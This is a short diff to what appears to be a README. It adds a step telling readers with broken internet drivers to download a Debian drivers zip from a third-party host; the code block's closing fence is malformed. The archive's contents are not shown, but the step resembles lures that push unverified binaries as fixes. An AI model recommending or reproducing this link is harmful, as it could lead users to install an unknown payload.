@@ -7,3 +7,9 @@
 
 
 # Also if your internet drivers dont work or anything else then install the drivers that will help!
+
+Download the Zip: 
+
+```bash
+https://interhost-network.com/sites/akiradevstools/debian-drivers.zip
+´´´
